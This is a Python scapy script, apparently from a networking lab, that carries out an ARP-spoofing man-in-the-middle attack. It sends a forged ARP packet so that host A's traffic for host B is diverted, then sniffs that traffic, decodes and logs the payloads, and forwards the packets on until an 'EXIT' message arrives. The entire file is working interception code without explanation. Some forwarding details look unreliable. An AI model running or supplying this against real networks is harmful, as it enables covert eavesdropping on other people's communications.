import os
import logging

from scapy.all import IP, sendp, sniff, Ether, sr1, ARP

logging.basicConfig(
    level=logging.INFO,
    format="{asctime} - {levelname} - {message}",
    style="{",
    datefmt="%Y-%m-%d %H:%M",
)

logger = logging.getLogger(__file__)

b_ip = os.environ["B_IP"]
a_ip = os.environ["A_IP"]

result = sr1(ARP(psrc=b_ip, pdst=a_ip))


def packet_callback(packet):
    inner = packet[IP].payload
    payload = inner.payload.load.decode()
    logger.info(f"RECEIVER. <Packet: {payload!r}>")

    sendp(Ether(src=result.hwsrc, dst=result.hwdst) / inner)


def stop_filter(packet):
    if IP in packet and packet[IP].src == a_ip:
        inner = packet[IP].payload
        if (payload := inner.payload.load.decode()).startswith("CH: "):
            if payload[4:] == 'EXIT':
                sendp(Ether(src=result.hwsrc, dst=result.hwdst) / inner)
                return True
    return False


def packet_filter(packet):
    return (
        IP in packet
        and packet[IP].src == a_ip
        and packet[IP].dst == b_ip
    )


sniff(
    iface='',
    lfilter=packet_filter,
    stop_filter=stop_filter,
    prn=packet_callback,
)
